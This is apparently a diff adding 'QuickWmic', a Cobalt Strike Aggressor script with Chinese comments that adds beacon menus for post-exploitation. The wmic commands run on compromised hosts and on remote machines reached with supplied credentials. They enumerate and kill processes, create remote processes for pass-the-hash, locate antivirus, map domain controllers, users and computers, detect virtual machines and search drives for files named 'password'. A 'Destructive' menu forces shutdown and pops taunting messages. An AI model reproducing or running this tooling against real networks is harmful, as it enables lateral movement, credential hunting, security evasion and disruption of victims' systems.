@@ -1,0 +1,756 @@
+#根据进程名获取路径-本地
+sub Get-Path  {
+  $bid = $1;
+  $dialog = dialog("Get-Path", #窗口名称
+  %(processname => ""),  #这是会话框提示，必须
+  lambda({
+      #bupload($bid, $3['payloadfile']);
+	  bshell($bid, 'cmd /c wmic process where name="'.$3['processname'].'" get ExecutablePath');      
+  }));
+  
+  dialog_description($dialog, "找找杀毒装哪了");
+  
+  drow_text($dialog, "processname",  "ProcessName:");       
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#根据进程名获取路径-远程
+sub Get-Path-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-Path-Remote", #窗口名称
+  %(processname => "", IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" process where name="'.$3['processname'].'" get ExecutablePath');      
+  }));
+  
+  dialog_description($dialog, "找找杀毒装哪了");
+  
+  drow_text($dialog, "processname",  "ProcessName:");
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#获取所有进程-本地
+sub Get-All  {
+  $bid = $1;
+  $dialog = dialog("All Process", #窗口名称
+  %(processname => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic Process get name,ExecutablePath,ProcessId');      #修改自定义的计划任务命令
+  }));
+  
+  dialog_description($dialog, "奇怪的方式获取进程");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取所有进程-远程
+sub Get-All-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-All-Remote", #窗口名称
+  %(IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" Process get name,ExecutablePath,ProcessId');      
+  }));
+  
+  dialog_description($dialog, "奇怪的方式获取进程");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#根据进程ID杀掉进程-本地
+sub Kill-Process  {
+  $bid = $1;
+  $dialog = dialog("Kill-Process", #窗口名称
+  %(process_id => ""),  #这是会话框提示，必须
+  lambda({
+      #bupload($bid, $3['payloadfile']);
+	  bshell($bid, 'cmd /c wmic process where processid="'.$3['process_id'].'" delete'); 
+  }));
+  
+  dialog_description($dialog, "进程ID直接杀");
+  
+  drow_text($dialog, "process_id",  "ProcessId:");       
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#根据进程ID杀掉进程-远程
+sub Kill-Process-Remote  {
+  $bid = $1;
+  $dialog = dialog("Kill-Process-Remote", #窗口名称
+  %(IP => "", user => "", pass => "", process_id => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" process where processid="'.$3['process_id'].'" delete');      
+  }));
+  
+  dialog_description($dialog, "进程ID直接杀");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  drow_text($dialog, "process_id",  "ProcessId:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#远程创建程序-配合PTH
+sub Create-Process-Remote  {
+  $bid = $1;
+  $dialog = dialog("Create-Process-Remote", #窗口名称
+  %(IP => "", user => "domain\\user", pass => "", process_id => "", processname => "C:\\sc.exe"),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" process call create "'.$3['processname'].'"');      
+  }));
+  
+  dialog_description($dialog, "PTH必备，路径记得双写");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  drow_text($dialog, "processname",  "exepath:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#获取杀毒-本地
+
+sub Get-AntiVirus  {
+  $bid = $1;
+  $dialog = dialog("youhejingma", #窗口名称
+  %(AntiVirus => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /Namespace:\\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List');      #修改自定义的计划任务命令
+  }));
+  
+  dialog_description($dialog, "这样查杀毒不太准");
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取杀毒-远程
+sub Get-AntiVirus-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-AntiVirus-Remote", #窗口名称
+  %(IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" /Namespace:\\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List');      
+  }));
+  
+  dialog_description($dialog, "这样查杀毒不太准");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取域控-本地
+sub Get-DC  {
+  $bid = $1;
+  $dialog = dialog("Get-DC", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /Namespace:\\\root\directory\ldap path ds_computer where ds_useraccountcontrol=532480 get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem');      
+  }));
+  
+  dialog_description($dialog, "NoPac冲！什么？最新漏洞不是NoPac？");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#获取域控-远程
+sub Get-DC-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-DC-Remote", #窗口名称
+  %(IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" /Namespace:\\\root\directory\ldap path ds_computer where ds_useraccountcontrol=532480 get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem');      
+  }));
+  
+  dialog_description($dialog, "NoPac冲！什么？最新漏洞不是NoPac？");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取域内机器-本地
+sub Get-ADcomputer  {
+  $bid = $1;
+  $dialog = dialog("Get-ADcomputer", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /Namespace:\\\root\directory\ldap path ds_computer get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem');      
+  }));
+  
+  dialog_description($dialog, "奇怪的查询域计算机的方法出现了");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#获取域内机器-远程
+sub Get-ADcomputer-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-ADcomputer-Remote", #窗口名称
+  %(IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" /Namespace:\\\root\directory\ldap path ds_computer get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem');      
+  }));
+  
+  dialog_description($dialog, "奇怪的查询域计算机的方法出现了");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#获取域内用户-本地
+sub Get-ADuser  {
+  $bid = $1;
+  $dialog = dialog("Get-ADuser", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /Namespace:\\\root\directory\ldap path ds_user get ds_name,DS_distinguishedName,DS_userPrincipalName,DS_description,DS_memberOf');      
+  }));
+  
+  dialog_description($dialog, "奇怪的查询域用户的方法出现了");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#获取域内用户-远程
+sub Get-ADuser-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-ADuser-Remote", #窗口名称
+  %(IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" /Namespace:\\\root\directory\ldap path ds_user get ds_name,DS_distinguishedName,DS_userPrincipalName,DS_description,DS_memberOf');      
+  }));
+  
+  dialog_description($dialog, "奇怪的查询域用户的方法出现了");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取域内DN-本地
+sub Get-DN  {
+  $bid = $1;
+  $dialog = dialog("Get-DN", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /Namespace:\\\root\directory\ldap path ds_domain get ds_distinguishedname,ds_dc');      
+  }));
+  
+  dialog_description($dialog, "我需要FQDN");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取域内DN-远程
+sub Get-DN-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-DN-Remote", #窗口名称
+  %(IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" /Namespace:\\\root\directory\ldap path ds_domain get ds_distinguishedname,ds_dc');      
+  }));
+  
+  dialog_description($dialog, "我需要FQDN");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取BIOS信息,通过版本判断虚拟机-本地 
+sub Get-BIOS  {
+  $bid = $1;
+  $dialog = dialog("Get-BIOS", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic path win32_bios get BIOSVersion,Manufacturer,name');      
+  }));
+  
+  dialog_description($dialog, "让我看看是不是虚拟机");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取BIOS信息-远程
+sub Get-BIOS-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-BIOS-Remote", #窗口名称
+  %(IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" path win32_bios get BIOSVersion');      
+  }));
+  
+  dialog_description($dialog, "让我看看是不是虚拟机");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取磁盘分区-本地
+sub Get-DISK  {
+  $bid = $1;
+  $dialog = dialog("Get-DISK", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic path Win32_LogicalDisk get Caption,VolumeName');      
+  }));
+  
+  dialog_description($dialog, "这个功能有什么意义吗？");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#获取磁盘分区-远程
+sub Get-DISK-Remote  {
+  $bid = $1;
+  $dialog = dialog("Get-DISK-Remote", #窗口名称
+  %(IP => "", user => "", pass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" path Win32_LogicalDisk get Caption,VolumeName');      
+  }));
+  
+  dialog_description($dialog, "这个功能有什么意义吗？");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#PING-本地
+sub Ping  {
+  $bid = $1;
+  $dialog = dialog("Ping", #窗口名称
+  %(IP => "127.0.0.1"),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic path Win32_PingStatus where Address="'.$3['IP'].'" get BufferSize,ReplySize,Timeout');      
+  }));
+  
+  dialog_description($dialog, "一种你没有见过的ping方法");
+  drow_text($dialog, "IP",  "IPaddress:"); 
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#PING-远程
+sub Ping-Remote  {
+  $bid = $1;
+  $dialog = dialog("Ping-Remote", #窗口名称
+  %(IP => "", user => "", pass => "", pip => "127.0.0.1"),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic /node:"'.$3['IP'].'" /user:"'.$3['user'].'" /password:"'.$3['pass'].'" path Win32_PingStatus where Address="'.$3['pip'].'" get BufferSize,ReplySize,Timeout');      
+  }));
+  
+  dialog_description($dialog, "一种你没有见过的ping方法");
+  
+  drow_text($dialog, "IP",  "Ipaddress:");  
+  drow_text($dialog, "user",  "username:");
+  drow_text($dialog, "pass",  "password:");
+  drow_text($dialog, "pip",  "DstIP:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#判断是不是笔记本
+sub IsBook  {
+  $bid = $1;
+  $dialog = dialog("IsBook", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic path Win32_ComputerSystem get PCSystemType,SystemType');      
+  }));
+  
+  dialog_description($dialog, "2代表笔记本"); 
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#查询CPU
+sub Get-CPU  {
+  $bid = $1;
+  $dialog = dialog("Get-CPU", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic cpu get name');      
+  }));
+  
+  dialog_description($dialog, "你电脑什么配置？"); 
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#查询OS
+sub Get-OS  {
+  $bid = $1;
+  $dialog = dialog("Get-OS", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic os get Caption,OSArchitecture');      
+  }));
+  
+  dialog_description($dialog, "让我瞧瞧谁还在用win7"); 
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+
+
+#强制关机
+sub Shutdown  {
+  $bid = $1;
+  $dialog = dialog("Shutdown", #窗口名称
+  %(IP => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic os Where (primary="1") call win32shutdown 12');      
+  }));
+  
+  dialog_description($dialog, "3秒之内关了你"); 
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#按分区删文件
+sub DeleteFile  {
+  $bid = $1;
+  $dialog = dialog("DeleteFile", #窗口名称
+  %(Drive => "e:"),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic datafile where drive="'.$3['user'].'" call delete');      
+  }));
+  
+  dialog_description($dialog, "未完成"); 
+  drow_text($dialog, "Drive",  "Drive:");  
+  
+  dbutton_action($dialog, "xxn");
+  
+  dialog_show($dialog);
+}
+
+
+
+
+
+#依文件名模糊查询指定盘符下的文件
+sub Search-File  {
+  $bid = $1;
+  $dialog = dialog("Search-File", #窗口名称
+  %(drive => "c:", fname => "密码"),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c wmic datafile where "drive="'.$3['drive'].'" and filename like "%'.$3['fname'].'%"" get name');      
+  }));
+  
+  dialog_description($dialog, "我马上就要找到密码本了");
+  
+  drow_text($dialog, "drive",  "drive");  
+  drow_text($dialog, "fname",  "filename:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#弹窗
+sub Shoot  {
+  $bid = $1;
+  $dialog = dialog("Shoot", #窗口名称
+  %(msg => "别分析了大哥"),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd /c mshta vbscript:Execute("msgbox ""'.$3['msg'].'"":close")');
+	  bshell($bid, 'cmd /c msg %username% /time:1000 "'.$3['msg'].'"');
+  }));
+  
+  dialog_description($dialog, "与对方展示一个友善的窗口"); 
+  drow_text($dialog, "msg",  "msg:");  
+  
+  dbutton_action($dialog, "xxn");
+  
+  dialog_show($dialog);
+}
+
+
+#菜单栏
+popup beacon_bottom {
+	menu "QuickWmic"{
+		#进程菜单
+        menu "Process" {
+		item "Get-Path"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-Path($bid);
+        }}
+		
+		item "Get-Path-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-Path-Remote($bid);
+        }}
+		
+
+		item "Get-All"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-All($bid);
+        }}
+		
+		item "Get-All-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-All-Remote($bid);
+        }}
+		
+		
+		item "Kill-Process"{
+        local('$bid');
+        foreach $bid ($1) {
+          Kill-Process($bid);
+        }}
+		
+		item "Kill-Process-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Kill-Process-Remote($bid);
+        }}
+		
+		item "Create-Process-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Create-Process-Remote($bid);
+        }}
+		
+		
+		}
+		
+		#杀毒菜单
+		menu "AntiVirus"{
+		item "Get-AntiVirus"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-AntiVirus($bid);
+        }}
+		
+		item "Get-AntiVirus-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-AntiVirus-Remote($bid);
+        }}
+				
+		}
+		
+		#域菜单
+		menu "AD"{
+		item "Get-DC"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-DC($bid);
+        }}
+		
+		item "Get-DC-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-DC-Remote($bid);
+        }}
+		
+		item "Get-ADcomputer"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-ADcomputer($bid);
+        }}
+		
+		item "Get-ADcomputer-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-ADcomputer-Remote($bid);
+        }}
+		
+		item "Get-ADuser"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-ADuser($bid);
+        }}
+		
+		item "Get-ADuser-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-ADuser-Remote($bid);
+        }}
+		
+		item "Get-DN"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-DN($bid);
+        }}
+		
+		item "Get-DN-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-DN-Remote($bid);
+        }}
+				
+		}
+		
+		#硬件菜单
+		menu "HardWare"{
+		item "Get-BIOS"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-BIOS($bid);
+        }}
+		
+		item "Get-BIOS-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-BIOS-Remote($bid);
+        }}
+		
+		item "Get-DISK"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-DISK($bid);
+        }}
+		
+		item "Get-DISK-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-DISK-Remote($bid);
+        }}
+		
+		item "Get-CPU"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-CPU($bid);
+        }}
+		
+		item "Get-OS"{
+        local('$bid');
+        foreach $bid ($1) {
+          Get-OS($bid);
+        }}
+		
+		
+		item "IsBook"{
+        local('$bid');
+        foreach $bid ($1) {
+          IsBook($bid);
+        }}
+		
+
+		}
+		
+		#PING菜单
+		menu "Ping"{
+		item "Ping"{
+        local('$bid');
+        foreach $bid ($1) {
+          Ping($bid);
+        }}
+		
+		item "Ping-Remote"{
+        local('$bid');
+        foreach $bid ($1) {
+          Ping-Remote($bid);
+        }}
+		
+		}
+		
+		#文件菜单
+		menu "File"{
+		item "Search-File"{
+        local('$bid');
+        foreach $bid ($1) {
+          Search-File($bid);
+        }}
+		
+		
+		
+		}
+		
+		#破坏性菜单
+		menu "Destructive"{
+		item "Shutdown"{
+        local('$bid');
+        foreach $bid ($1) {
+          Shutdown($bid);
+        }}
+		
+		
+		item "Shoot"{
+        local('$bid');
+        foreach $bid ($1) {
+          Shoot($bid);
+        }}
+		
+		
+		
+		}
+
+		
+		
+}
+}
